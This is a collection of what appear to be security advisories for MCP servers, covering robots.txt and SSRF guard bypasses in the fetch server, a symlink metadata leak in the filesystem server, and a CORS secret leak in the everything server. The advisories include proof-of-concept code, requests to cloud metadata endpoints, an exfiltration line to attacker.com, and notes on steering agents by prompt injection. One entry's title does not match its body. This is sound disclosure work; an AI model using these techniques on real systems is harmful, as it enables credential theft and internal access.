summary: robots.txt enforcement bypass via HTTP redirects in mcp-server-fetch
description:
### Summary

`mcp-server-fetch` checks robots.txt for the URL the model asks for, then lets httpx follow redirects without checking robots.txt again. A page on a host that allows autonomous fetching can redirect to a URL that robots.txt forbids, on another host or on the same one, and the server fetches it and returns the content to the model. This is the default configuration and applies to fetches made through the `fetch` tool, which is where the README says robots.txt is obeyed. The attacker needs the model to fetch a URL they control, or a site that redirects on its own.

### Details

robots.txt is checked once, for the URL passed to the `fetch` tool, in the tool handler ([server.py#L452-L465](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/fetch/src/mcp_server_fetch/server.py#L452-L465)):

```python
page_url = str(url)

if not ignore_robots_txt:
    await check_may_autonomously_fetch_url(
        page_url, user_agent_autonomous, proxy_url, allow_private_ips
    )

content, prefix = await fetch_url(
    page_url,
    user_agent_autonomous,
    force_raw=raw,
    proxy_url=proxy_url,
    allow_private_ips=allow_private_ips,
)
```

`check_may_autonomously_fetch_url` ([L247-L293](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/fetch/src/mcp_server_fetch/server.py#L247-L293)) downloads `/robots.txt` from that URL's host and calls `can_fetch()` for that one URL. `fetch_url` ([L296-L317](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/fetch/src/mcp_server_fetch/server.py#L296-L317)) then fetches it with redirects on:

```python
async with make_client(proxy_url) as client:
    if not allow_private_ips:
        client.event_hooks = {"request": [_refuse_private_destination]}
    try:
        response = await client.get(
            url,
            follow_redirects=True,
            headers={"User-Agent": user_agent},
            timeout=30,
        )
```

httpx follows the 3xx chain inside that `get()`. The only thing that runs per hop is `_refuse_private_destination` (unless `--allow-private-ips` is set), the private-address hook from #5033. Nothing reads robots.txt for a hop's URL, so the server fetches wherever the chain ends. robots.txt belongs to one origin (RFC 9309 section 2.3 gives its URI as `scheme:[//authority]/robots.txt`), which leaves two cases open:

- The requested URL is on a host that allows it (or has no robots.txt) and redirects to another host whose robots.txt says `Disallow: /`, or answers 401/403, which this server treats as "not allowed" ([L274-L277](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/fetch/src/mcp_server_fetch/server.py#L274-L277)). The second host's robots.txt is never requested.
- The requested URL redirects within the same host to a path that the host's own robots.txt disallows. The rules were downloaded, but `can_fetch()` only ran for the original path.

The private-address guard still runs on every hop, so this is only about robots.txt.

The `server.py` in the PyPI 2026.10.19 wheel is identical to this commit's. The same script also reproduces on 2026.8.18, 2025.4.7, 2025.1.14 and 0.6.2, with `--allow-private-ips` dropped (it doesn't exist before 2026.10.10) and `isError` for `is_error` (SDK 1.x client). The last three ran with `mcp==1.9.0` and `pydantic==2.10.6`. On 0.6.2 and 2025.1.14 the control calls fail with an unrelated `McpError` constructor error under that SDK and return no content.

### The existing test

`tests/test_protocol.py` pins the current behaviour, inside `test_allow_private_ips_follows_redirect_to_private_address` ([L845-L861](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/fetch/tests/test_protocol.py#L845-L861)):

```python
    # robots.txt is only consulted for the original host, never the target.
    assert web.urls() == [ROBOTS, PAGE, metadata, metadata]
```

I read that as a record of what the code does today, in a test whose subject is `--allow-private-ips`, not as a decision that redirects are exempt. The line came in with #4971 (merged 2026-10-04), whose description lists it under "Characterized (pinned, not fixed)" and says each pinned item carries a comment "so the fixing PR knows which assertion to change". There the item is filed under #4838, and #5033, which closed #4838, only dealt with the private-address half.

The README's robots.txt section ([README.md#L168-L172](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/fetch/README.md?plain=1#L168-L172)) says:

> By default, the server will obey a websites robots.txt file if the request came from the model (via a tool), but not if the request was user initiated (via a prompt).

and nothing about redirects, while the CAUTION at the top of the same file ([L14](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/fetch/README.md?plain=1#L14)) says the private-address guard "checks every redirect hop the same way". SECURITY.md ([L63-L65](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/SECURITY.md?plain=1#L63-L65)) names `robots.txt` among the boundaries a server claims to enforce: "A way around a boundary a server claims to enforce (its allowed directories, the client's Roots, or `robots.txt`, for example) is a vulnerability". From the site's side, a model-initiated request for its URL is an autonomous fetch however the request got there. If redirects are meant to be exempt, the README should say so; if not, that assertion is what changes, and the patch updates it.

### Related work

#4838 was fixed by #5033, which registered `_refuse_private_destination` as a request hook so every hop goes through the address guard. robots.txt was not part of that change. Three older open PRs for the same address problem (#4497, #4773, #4803) replace automatic redirects with a manual loop; none of them checks robots.txt inside the loop either. I found no issue, PR or published advisory in this repo about robots.txt and redirects. #5197 is about 5xx responses on robots.txt, a different bug.

### Suggested fix

Check robots.txt in a second request hook, for every request after the first (the handler has already checked the first one), and only when the caller asked for robots.txt enforcement:

```diff
diff --git a/src/fetch/src/mcp_server_fetch/server.py b/src/fetch/src/mcp_server_fetch/server.py
index bdac272..9618251 100644
--- a/src/fetch/src/mcp_server_fetch/server.py
+++ b/src/fetch/src/mcp_server_fetch/server.py
@@ -299,15 +299,31 @@ async def fetch_url(
     force_raw: bool = False,
     proxy_url: str | None = None,
     allow_private_ips: bool = False,
+    check_robots_txt: bool = False,
 ) -> Tuple[str, str]:
     """
     Fetch the URL and return the content in a form ready for the LLM, as well as a prefix string with status information.
     """
     from httpx import HTTPError
 
+    initial_url = str(httpx.URL(url))
+
+    async def _check_redirect_robots(request: httpx.Request) -> None:
+        # The caller has already checked robots.txt for the requested URL;
+        # this checks the URL of every redirect hop after it.
+        if str(request.url) != initial_url:
+            await check_may_autonomously_fetch_url(
+                str(request.url), user_agent, proxy_url, allow_private_ips
+            )
+
     async with make_client(proxy_url) as client:
+        hooks = []
         if not allow_private_ips:
-            client.event_hooks = {"request": [_refuse_private_destination]}
+            hooks.append(_refuse_private_destination)
+        if check_robots_txt:
+            hooks.append(_check_redirect_robots)
+        if hooks:
+            client.event_hooks = {"request": hooks}
         try:
             response = await client.get(
                 url,
@@ -462,6 +478,7 @@ def create_server(
             force_raw=raw,
             proxy_url=proxy_url,
             allow_private_ips=allow_private_ips,
+            check_robots_txt=not ignore_robots_txt,
         )
         original_length = len(content)
         if start_index >= original_length:
```

The `fetch` prompt and `--ignore-robots-txt` don't pass the flag, so they behave as before. Behaviour change to be aware of: one extra robots.txt request per redirect hop, same-host hops included (I didn't add caching, to keep the diff small), and a redirect target whose robots.txt can't be fetched or answers 401/403 now fails the fetch, the same way it already does for the requested URL.

The full patch also adds four tests to `tests/test_protocol.py` and changes the assertion quoted above. I can post it here in full or open a PR against the private fork.

### Proof of concept

Tested at `51b6382a3e827aceb6bce430b1208d69b93d95ea` (`mcp-server-fetch` 2026.10.19) on Linux with Python 3.11.14, `mcp` 2.3.0 and `httpx` 0.27.2 (the last two as locked in `src/fetch/uv.lock`). The server is started as `python -m mcp_server_fetch --allow-private-ips`, with no other arguments and no proxy. robots.txt enforcement is on (the default); `--allow-private-ips` is only there because the two test sites listen on 127.0.0.1. The client is the Python MCP SDK's stdio client, not a desktop client.

```bash
git clone https://github.com/modelcontextprotocol/servers.git
cd servers && git checkout 51b6382a3e827aceb6bce430b1208d69b93d95ea
cd src/fetch && uv sync --frozen
# save the script below as poc_redirect_robots.py in this directory, then:
uv run --frozen python poc_redirect_robots.py
```

The script starts two local sites on different ports (so they are different origins). Site B's robots.txt disallows everything. Site A's disallows `/private`; A has `/go`, which redirects to B, and `/public`, which redirects to A's own `/private/report`. It calls the `fetch` tool on B and on A's `/private/report` directly (controls), then on the two redirecting URLs.

```python
"""mcp-server-fetch: robots.txt is checked for the requested URL, not for redirect targets.

Two local sites on different ports (so two origins). Run from an environment where
mcp-server-fetch is installed:  python poc_redirect_robots.py [server args...]
With no arguments the server is started with --allow-private-ips (needed only
because the sites are on 127.0.0.1).
"""

import asyncio
import os
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

HITS = []  # "site path" for every request the two sites receive


def serve(name, routes):
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            HITS.append(f"{name}{self.path}")
            status, headers, body = routes(self.path)
            self.send_response(status)
            self.send_header("Content-Type", "text/plain")
            for k, v in headers.items():
                self.send_header(k, v)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args):
            pass

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd.server_port


# Site B disallows everything.
def site_b(path):
    if path == "/robots.txt":
        return 200, {}, b"User-agent: *\nDisallow: /\n"
    if path == "/secret":
        return 200, {}, b"SECRET-FROM-B"
    return 404, {}, b"not found"


port_b = serve("B", site_b)


# Site A allows everything except /private, and has two redirects.
def site_a(path):
    if path == "/robots.txt":
        return 200, {}, b"User-agent: *\nDisallow: /private\n"
    if path == "/go":  # cross-origin: -> site B
        return 302, {"Location": f"http://127.0.0.1:{port_b}/secret"}, b""
    if path == "/public":  # same origin: -> a disallowed path
        return 302, {"Location": "/private/report"}, b""
    if path == "/private/report":
        return 200, {}, b"PRIVATE-REPORT"
    return 404, {}, b"not found"


port_a = serve("A", site_a)

CASES = [
    # (label, url, redirects?)
    ("control   B/secret          (robots Disallow: /)", f"http://127.0.0.1:{port_b}/secret", False),
    ("control   A/private/report  (robots Disallow: /private)", f"http://127.0.0.1:{port_a}/private/report", False),
    ("redirect  A/go     -> B/secret", f"http://127.0.0.1:{port_a}/go", True),
    ("redirect  A/public -> A/private/report", f"http://127.0.0.1:{port_a}/public", True),
]


async def main():
    args = sys.argv[1:] or ["--allow-private-ips"]
    params = StdioServerParameters(
        command=sys.executable, args=["-m", "mcp_server_fetch", *args]
    )
    leaked = False
    with open(os.devnull, "w") as devnull:
        async with stdio_client(params, errlog=devnull) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                for label, url, is_redirect in CASES:
                    result = await session.call_tool("fetch", {"url": url})
                    text = result.content[0].text
                    if not result.is_error:
                        outcome = "FETCHED"
                    elif "robots.txt" in text and "not allowed" in text:
                        outcome = "BLOCKED by robots.txt"
                    else:
                        outcome = f"ERROR: {text[:80]}"
                    print(f"{label:58} -> {outcome}")
                    if not result.is_error:
                        print(f"    {text.splitlines()[-1]}")
                    leaked |= is_redirect and not result.is_error
    print("requests seen by the sites:", HITS)
    print("VULNERABLE" if leaked else "OK: redirect targets are checked")
    sys.exit(1 if leaked else 0)


asyncio.run(main())
```

Expected: all four calls refused. Actual at that commit:

```text
control   B/secret          (robots Disallow: /)           -> BLOCKED by robots.txt
control   A/private/report  (robots Disallow: /private)    -> BLOCKED by robots.txt
redirect  A/go     -> B/secret                             -> FETCHED
    SECRET-FROM-B
redirect  A/public -> A/private/report                     -> FETCHED
    PRIVATE-REPORT
requests seen by the sites: ['B/robots.txt', 'A/robots.txt', 'A/robots.txt', 'A/go', 'B/secret', 'A/robots.txt', 'A/public', 'A/private/report']
VULNERABLE
```

In the request log, B's robots.txt is requested for the direct call only; after `A/go` the server goes straight to `B/secret`. With the patch from the Details section applied the script exits 0:

```text
control   B/secret          (robots Disallow: /)           -> BLOCKED by robots.txt
control   A/private/report  (robots Disallow: /private)    -> BLOCKED by robots.txt
redirect  A/go     -> B/secret                             -> BLOCKED by robots.txt
redirect  A/public -> A/private/report                     -> BLOCKED by robots.txt
requests seen by the sites: ['B/robots.txt', 'A/robots.txt', 'A/robots.txt', 'A/go', 'B/robots.txt', 'A/robots.txt', 'A/public', 'A/robots.txt']
OK: redirect targets are checked
```

The same scenario is also in the patch as in-process tests, which run with the default private-address guard on (no `--allow-private-ips`). The fetch suite is 145 passed at HEAD and 149 with the patch. With only the test changes applied on HEAD, 4 tests fail: three of the new ones and the updated assertion (the fourth new test guards `--ignore-robots-txt`). `ruff check`, `ruff format --check` and `pyright` are clean with the patch.

### Impact

Anyone running `mcp-server-fetch` with robots.txt enforcement on (the default), for fetches the model makes through the `fetch` tool. The `fetch` prompt skips robots.txt by design and is not affected.

The attacker needs a URL the model will fetch and that the robots.txt check lets through: a page they host on a host with no robots.txt or a permissive one, answering with a redirect. A site can also trip it without any attacker, with an ordinary redirect from an allowed path to a disallowed one. In both cases the final URL is never checked against the robots.txt of the host it ends up on.

What they get is content from URLs whose site asked autonomous agents to stay away, including hosts whose robots.txt answers 401/403. I'm not claiming access to anything non-public: robots.txt is a request to crawlers, not access control, and the private-address guard still applies on every hop. The harm is to the person running the server, who has been told robots.txt is obeyed, and to the site owners whose policy gets ignored.

summary: fetch server: SSRF guard treats the well-known NAT64 prefix 64:ff9b::/96 as public, so a metadata address is reachable on NAT64/DNS64 egress
description:
### Summary

In mcp-server-fetch, `_is_public_address()` (src/fetch/src/mcp_server_fetch/server.py) decides whether a resolved address is a public destination. Its `_NON_PUBLIC_NETWORKS` list refuses the local-use NAT64 prefix `64:ff9b:1::/48` (RFC 8215) and the 6to4 prefix `2002::/16`, but it does not list the well-known NAT64 prefix `64:ff9b::/96` (RFC 6052) and does not decode the IPv4 embedded in its low 32 bits. An address `64:ff9b::<embedded-IPv4>` is therefore classified as public even when the embedded IPv4 is non-public, e.g. the cloud metadata endpoint 169.254.169.254. The `_refuse_private_destination` hook is correctly applied on every request and redirect hop; the gap is in the classifier itself.

### Details

Affected code: src/fetch/src/mcp_server_fetch/server.py, function `_is_public_address` and the module-level `_NON_PUBLIC_NETWORKS` tuple.

The tuple lists `64:ff9b:1::/48` (local-use NAT64) and `2002::/16` (6to4), and handles `ipv4_mapped`, but it omits the well-known NAT64 prefix `64:ff9b::/96` (RFC 6052). For an address in that prefix the function does not decode the embedded IPv4, and because the address is globally-scoped it falls through to `ip.is_global and not ip.is_multicast`, returning True.

Impact (CWE-918): on a host whose egress uses NAT64/DNS64 (RFC 6146/6147) — common on IPv6-only networks, including some cloud environments — `64:ff9b::a9fe:a9fe` routes to 169.254.169.254, so a fetch the server believes is public reaches the metadata endpoint the guard is documented to refuse. Where the server is exposed to attacker-influenced URLs (its purpose), this is an SSRF-guard bypass to internal/metadata addresses on such networks. On a host without NAT64 egress the address is not routable, so, like the DNS-rebinding caveat the README already states, exploitability depends on the deployment.

This is the same class as several advisories published in the last week (IPv6-transition / embedded-IPv4 blocklist gaps), so it is a known, recurring pattern.

Suggested fix: before the network checks, decode embedded-IPv4 forms and classify the embedded address (for `64:ff9b::/96` take the low 32 bits, as the code already does for `ipv4_mapped`); or simply add `64:ff9b::/96` to `_NON_PUBLIC_NETWORKS`, since a NAT64-wrapped public IPv4 is reachable directly anyway. I'm happy to open a PR with tests once this is acknowledged, following CONTRIBUTING.

AI disclosure (per your CONTRIBUTING's AI-assisted workflow): this report was prepared with AI assistance (Claude Code) — a source review plus a unit-level evaluation of the installed classifier. The behaviour is confirmed by that evaluation, not assumed; I reviewed it.

### Proof of concept

Unit-level reproduction against the project's own classifier (no network, no third-party system). Import the real function from the installed package and classify addresses that each encode 169.254.169.254 through different IPv6 representations:

    import mcp_server_fetch.server as s
    s._is_public_address("169.254.169.254")        # -> False  (plain link-local, correct)
    s._is_public_address("::ffff:169.254.169.254") # -> False  (IPv4-mapped, correct)
    s._is_public_address("64:ff9b:1::a9fe:a9fe")    # -> False  (local-use NAT64, correct)
    s._is_public_address("2002:a9fe:a9fe::")        # -> False  (6to4, correct)
    s._is_public_address("64:ff9b::a9fe:a9fe")      # -> True   (well-known NAT64 -> treated as PUBLIC)
    s._is_public_address("8.8.8.8")                 # -> True   (real public, control)

The 64:ff9b::a9fe:a9fe case embeds 169.254.169.254 in the low 32 bits of the well-known NAT64 prefix and is classified as public. No request was sent and no cloud or third-party system was touched; this evaluates the same surface the project's tests cover. On a NAT64/DNS64 network that address resolves/routes to the metadata endpoint.

### Impact

CWE-918 (SSRF). On a host whose egress uses NAT64/DNS64 (common on IPv6-only networks, including some cloud environments), an attacker who can influence a fetched URL can reach internal-only services and the cloud metadata endpoint 169.254.169.254 by using an address in the well-known NAT64 prefix 64:ff9b::/96 that embeds the target IPv4, because _is_public_address classifies it as public. This defeats the SSRF guard the server documents as refusing metadata/private addresses, and the response is returned to the caller. On hosts without NAT64 egress the address is not routable, so exploitability depends on the deployment, like the DNS-rebinding caveat already noted in the README.

summary: fetch: private-address guard bypass via IDNA hostnames (check and connect resolve different names)
description:
### Summary

The private-address guard added in `mcp-server-fetch` 2026.10.10 checks a different hostname than
the one httpx connects to when the URL has an internationalized (IDNA) host: the guard resolves the
IDNA 2003 form (`faß` becomes `fass`) while httpx connects to the IDNA 2008 form (`xn--fa-hia`).
Anyone who controls a domain can point the two names at a public and an internal address and reach
loopback, private-network or cloud-metadata endpoints through the `fetch` tool in its default
configuration, which the README says refuses those addresses. Severity: CVSS 4.0 6.3 (Medium); the
CVSS 3.1 equivalent is 7.4 (High).

### Details

`mcp-server-fetch` 2026.10.10 added a guard that refuses loopback, private, link-local and cloud
metadata addresses by default (PR #5033, the fix for the SSRF tracked as CVE-2026-104120). The guard
is an httpx request hook, `_refuse_private_destination`, which resolves `request.url.host` with
`getaddrinfo` and refuses the request if any address is not public
(`src/fetch/src/mcp_server_fetch/server.py` L119-L143 at tag v1.0.0,
`c003d0d807409b22fa640d1f8e11f38f15755721`, which is the published 2026.10.10 code). The fetch README
states that by default the server refuses non-public addresses, including cloud metadata endpoints,
and lists two limits: DNS rebinding between the check and the connection, and hostnames the server
cannot resolve itself (proxy-only names). The issue below is neither. It is still present on the
development line (`v2/main` at `6d613ecff7d320e0e0414a997f46bc4b3367c50d`, `server.py` L140-L154).

For an internationalized hostname the hook and the connection resolve different names:

- httpx stores the host IDNA 2008 encoded (`URL.raw_host`, e.g. `xn--fa-hia.attacker.example`) and
  connects to that name.
- `URL.host`, which the hook passes to `getaddrinfo`, is the decoded Unicode form
  (`faß.attacker.example`). CPython's `socket.getaddrinfo` encodes a Unicode name with the built-in
  `idna` codec, which is IDNA 2003 and maps `ß` to `ss`, so the hook looks up
  `fass.attacker.example`.

The domain owner points `fass.` at any public address and `xn--fa-hia.` at an internal one. The hook
approves the public answer and httpx connects to the internal address. There is no timing involved,
so this is separate from the documented DNS-rebinding limit.

The same mismatch also reaches the documented proxy-only branch (L130-L133, which skips the check
when the hook's lookup fails) for a name the server does resolve: if the IDNA 2003 name does not
exist, the hook skips the check, and httpx resolves the IDNA 2008 name itself and connects directly,
with no proxy configured. The fix below covers both.

Both apply to the URL the model passes to the `fetch` tool and to every redirect hop, since all of
them go through the same hook. `ß` is one example; final sigma `ς` gives the same split (`σοφος` is
`xn--0xaajbq` for the connector and `xn--0xaakcn` for the hook). Characters that httpx's IDNA 2008
encoder rejects (ZWJ/ZWNJ, compatibility forms such as `Ⅳ` or `ﬁ`) cannot be used.

Suggested fix: resolve and check the exact name the connection uses,
`request.url.raw_host.decode("ascii")` instead of `request.url.host`, and treat a resolution failure
as a refusal unless a proxy is configured. Doing the check inside the transport (resolve once,
connect to the checked address) would also close the documented DNS-rebinding gap.

### Proof of concept

Reproduction:

1. In a DNS zone you control, create `fass.<zone>` with any public A record and
   `xn--fa-hia.<zone>` with an internal A record (I used 127.0.0.1, standing in for an internal or
   metadata endpoint). Optionally leave `fass.nx.<zone>` undefined and create
   `xn--fa-hia.nx.<zone>` -> 127.0.0.1 to see the proxy-only branch reached without a proxy.
2. Run an HTTP service on the internal address (I used a stub on 127.0.0.1:80 that returns a canary
   JSON for `/latest/meta-data/...`).
3. Start `mcp-server-fetch` 2026.10.10 as `python -m mcp_server_fetch` with no arguments (no
   `--allow-private-ips`, no `--proxy-url`) and no relevant environment variables, so the guard is on.
   Client: the MCP Python SDK 1.30.0 (`ClientSession.call_tool`) over stdio.
4. Call the `fetch` tool with `http://xn--fa-hia.<zone>/latest/meta-data/...` (or the Unicode form
   `http://faß.<zone>/...`). The internal service's response comes back as the tool result.
   The same request with a plain name resolving to 127.0.0.1, or with `http://127.0.0.1/...`, is
   refused by the guard.

My run, in one disposable `python:3.12-slim` container with a toy DNS server on 127.0.0.1:53 and the
stub on 127.0.0.1:80 (nothing outside the container contacted after installing the package).
Versions: Python 3.12.15, mcp-server-fetch 2026.10.10, httpx 0.28.1, idna 3.20, mcp 1.30.0. The real
server was driven over stdio with the MCP Python client, calling `fetch` with `raw: true`:

| URL | Result |
|---|---|
| `http://127.0.0.1/latest/meta-data/...` | refused: "127.0.0.1 resolves to 127.0.0.1, which is not a public address" |
| `http://direct.attacker.test/latest/meta-data/...` | refused (resolves to 127.0.0.1) |
| `http://xn--fa-hia.attacker.test/latest/meta-data/...` | **returned the internal service's response** (`{"AccessKeyId": "ASIA-POC-CANARY", ...}`) |
| `http://faß.attacker.test/latest/meta-data/...` | **returned the internal response** |
| `http://xn--fa-hia.nx.attacker.test/latest/meta-data/...` | **returned the internal response** (hook lookup NXDOMAIN; the server itself resolved and connected to the IDNA 2008 name, no proxy) |

The internal service logged the requests with `Host: xn--fa-hia.attacker.test` and
`Host: xn--fa-hia.nx.attacker.test`, including the robots.txt check, which takes the same path.

Root cause in three lines:

```python
import httpx
u = httpx.URL("http://xn--fa-hia.attacker.test/")
print(u.host, u.raw_host, u.host.encode("idna"))
# faß.attacker.test b'xn--fa-hia.attacker.test' b'fass.attacker.test'
```

I can share the full container script (DNS server, stub service, MCP client) if it helps.


### Impact

Server-side request forgery (CWE-918) through a bypass of the default egress guard. Affected: anyone
running `mcp-server-fetch` 2026.10.10 with default settings, typically as a tool for an AI agent. The
guard exists to stop a model-supplied URL, for example one planted by prompt injection in fetched
content, from reaching loopback services, RFC 1918 hosts and cloud metadata endpoints from the
machine running the server. With this bypass an attacker who controls any domain gets that access
back, and the response is returned to the model, so it can be read or passed on.

Limits: the attacker needs the model to fetch an attacker URL (prompt injection or a user request);
what is reachable depends on where the server runs; I tested a loopback service standing in for a
metadata endpoint.

summary: Parent-Directory Fallback TOCTOU in @modelcontextprotocol/server-filesystem Permits Arbitrary File Write Outside allowedDirectories
@modelcontextprotocol/server-filesystem list_directory_with_sizes follows symlinks and leaks outside-directory file metadata
description:
## Description

`list_directory_with_sizes` validates only the requested directory path. It then iterates over entries and calls `fs.stat(entryPath)` on each child without validating the child path. `fs.stat()` follows symlinks, so a symlink inside an allowed directory that points to a file outside the allowed directory causes the tool to disclose the outside target's file size.

Direct reads through the same symlink are correctly denied by `read_text_file`, so this is a residual metadata bypass in `list_directory_with_sizes` on the current npm release rather than a report of the already-published 2025 symlink or prefix CVEs.

## Non-Duplicate Rationale

Known repository advisories GHSA-vjqx-cfc4-9h6v, GHSA-5cgr-j3jf-jw3v, GHSA-9xwc-hfwc-8w59, and GHSA-j22h-9j4x-23w5 affect `mcp-server-git`, not `@modelcontextprotocol/server-filesystem`.

The two relevant filesystem advisories are GHSA-q66q-fx2p-7w4m and GHSA-hc55-p739-j48w. They affect versions before `2025.7.1`. This report is reproduced against `@modelcontextprotocol/server-filesystem@2026.1.14`, after those fixes. It is also narrower: direct file-content access remains denied, but `list_directory_with_sizes` still leaks outside-target file size by following symlinks during child metadata collection.

## Source Locations

Repository source:
- `servers/src/filesystem/index.ts:465-473`

Published npm package:
- `touchstone-poc/mcp-modelcontextprotocol-server-filesystem/published-package/package/dist/index.js:353-360`

## Reproduction

1. Install or unpack `@modelcontextprotocol/server-filesystem@2026.1.14`.
2. Create an allowed directory and a separate outside directory.
3. Create a 1536-byte file in the outside directory.
4. Create a symlink inside the allowed directory pointing to that outside file.
5. Start the published server over stdio with the allowed directory.
6. Call `read_text_file` on the outside file. It is denied.
7. Call `read_text_file` on the symlink inside the allowed directory. It is denied.
8. Call `list_directory_with_sizes` on the allowed directory. It returns `1.50 KB` for the symlink, leaking the outside target's size.

PoC command:

```powershell
node touchstone-poc\mcp-modelcontextprotocol-server-filesystem\poc-list-directory-symlink-metadata.js
```

Observed output:

```json
{
  "directOutsideReadDenied": true,
  "symlinkReadDenied": true,
  "leakedSizeInListing": true,
  "outsideSecretSize": 1536,
  "listingText": "[FILE] link-to-outside-secret.bin        1.50 KB\n\nTotal: 1 files, 0 directories\nCombined size: 1.50 KB"
}
```

Full transcript:
- `touchstone-poc/mcp-modelcontextprotocol-server-filesystem/poc-list-directory-symlink-metadata-output.json`

## Impact

An attacker who can place or preserve a symlink inside an allowed directory can cause an MCP client or agent to call `list_directory_with_sizes` and disclose metadata about files outside the allowed directory. The confirmed leaked field is file size. This can reveal the existence and approximate size of sensitive files such as private keys, local databases, credentials, or other user files when a symlink to those files is present in the allowed tree.

## Preconditions

- The victim runs `@modelcontextprotocol/server-filesystem@2026.1.14` with an allowed directory.
- A symlink exists inside that allowed directory and points to a file outside the allowed directory.
- The attacker controls the MCP tool input directly, or indirectly through prompt injection or repository content that persuades an agent to call `list_directory_with_sizes`.

## Remediation

Validate each child path before following it:

```ts
const entryPath = path.join(validPath, entry.name);
const validEntryPath = await validatePath(entryPath);
const stats = await fs.stat(validEntryPath);
```

Alternatively, use `fs.lstat()` and report symlink metadata without following the target. If target metadata is intentionally shown, the target must be resolved and checked against the allowed-directory policy before calling `fs.stat()`.

## Reporter Credit

Credit: @cybercraftsolutionsllc

## Upgrading from a date-versioned release

`@modelcontextprotocol/server-filesystem` moved from date versions (2025.x, 2026.x) to semantic versions in 1.0.0. Package managers rank 2.0.1 below every 2025.x and 2026.x version, so they will not offer it as an upgrade and Dependabot will not open one. If you are on a date version, install the fix explicitly: `npm install @modelcontextprotocol/server-filesystem@2.0.1` (or `@latest`).

cwes.name: Improper Link Resolution Before File Access ('Link Following')

description:
### Summary
The mcp-server-everything package ships an HTTP MCP server that binds to all network interfaces (0.0.0.0) with wildcard CORS (Access-Control-Allow-Origin: *) and no authentication. It exposes a get-env tool that returns the entire contents of process.env — including all API keys, database credentials, and secrets — to any caller. Any web page open in the developer's browser can invoke this tool cross-origin with no user interaction, silently exfiltrating every secret in the process environment.

---

## Affected Components

| File | Issue |
|------|-------|
| `src/everything/transports/sse.ts:10-16` | `cors({ origin: "*" })` on SSE transport |
| `src/everything/transports/streamableHttp.ts:43-51` | `cors({ origin: "*" })` on StreamableHTTP transport |
| `src/everything/tools/get-env.ts:28` | `JSON.stringify(process.env, null, 2)` — unfiltered env dump |
| Both transports, `app.listen(PORT)` | No host binding restriction; defaults to `0.0.0.0` |

---
### Details

### Attack Chain

```
Developer running mcp-server-everything (SSE or StreamableHTTP)
  + real credentials in process.env (API keys, DB passwords, tokens)
  + developer visits any attacker-controlled page (malicious ad, phishing, typosquat)
        │
        ▼
Browser: EventSource("http://localhost:3001/sse")     ← CORS: * allows this
        │
        ▼
Attacker page completes MCP handshake (initialize → notifications/initialized)
        │
        ▼
Browser: POST /message?sessionId=... { method: "tools/call", name: "get-env" }
        │                                          ← CORS: * allows this
        ▼
Server returns JSON.stringify(process.env)
  → AWS_SECRET_ACCESS_KEY, OPENAI_API_KEY, DATABASE_URL, all tokens...
        │
        ▼
fetch("https://attacker.com/collect", { body: stolen_env })
        │
        ▼
All secrets exfiltrated. No browser warnings. No user prompts. No logs on victim machine.
```

### Why No Bypass Exists

Checked all potential mitigations — none are present:

1. **No env var flag to disable `get-env`**: `registerGetEnvTool(server)` is called unconditionally in `tools/index.ts:28`. No `DISABLE_GET_ENV`, `NO_GET_ENV`, or equivalent.

2. **No CORS allowlist or env var override**: `origin: "*"` is hardcoded. No `CORS_ORIGIN`, `ALLOWED_ORIGINS`, or similar override mechanism exists in either transport.

3. **No host binding restriction**: `app.listen(PORT)` with no host parameter. Node defaults to `0.0.0.0`, making the server reachable on all interfaces including loopback (browser-accessible) and LAN.

4. **No authentication**: No middleware on any route. `tools/call` is reachable immediately after the MCP handshake.

5. **No secret filtering in `get-env`**: No denylist, no regex scrubbing, no opt-in allowlist. All keys returned.

---

### PoC

Verified live on 2026-03-17 against `@modelcontextprotocol/server-everything` at HEAD (`1cdf806`).

### Setup

```bash
# Start server with fake credentials in env
SECRET_KEY="REAL_SECRET_EXFILTRATED_12345" \
OPENAI_API_KEY="sk-live-abcdefg" \
PORT=13001 \
node dist/index.js sse
```

### CORS Preflight Confirmation

```
OPTIONS /message HTTP/1.1
Origin: http://evil.com
Access-Control-Request-Method: POST

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: *       ← any origin accepted
Access-Control-Allow-Methods: GET,POST
Access-Control-Allow-Headers: Content-Type
```

### Full MCP Flow (Node.js)

```
Session: b1fa9222-8ec5-4ace-b7b8-f43659d6bc61
CORS cross-origin request: SUCCEEDED (Origin: evil.com)
Total vars stolen: 47
SECRET_KEY: REAL_SECRET_EXFILTRATED_12345
OPENAI_API_KEY: sk-live-abcdefg
USER: ehudmelzer
```

All 47 environment variables returned in a single `tools/call` response. Origin `http://evil.com` was accepted without restriction.

**PoC files**: See `attacker.html` (browser-based) and `start-victim-server.sh` attached under archive.zip + screen recording demonstration.

https://github.com/user-attachments/assets/0011fe4d-e62d-4eec-abb5-2c3627967865
[Archive.zip](https://github.com/user-attachments/files/26052918/Archive.zip)


---

### Impact

| Scenario | Impact |
|----------|--------|
| Developer runs SSE/StreamableHTTP transport locally during development | All secrets in env exfiltrated by any visited web page |
| CI/CD pipeline runs `mcp-server-everything` with injected credentials | Credentials stolen by any network-adjacent page load |
| Docker container with `--network host` running the server | Same as above, LAN-accessible |
| Developer uses one-click VS Code install shown in README (stdio only) | Not affected — stdio transport has no HTTP surface |

The stdio transport (default) is **not affected**. Only developers who explicitly start the SSE or StreamableHTTP transports are exposed. However:
- The README documents and encourages both HTTP transports
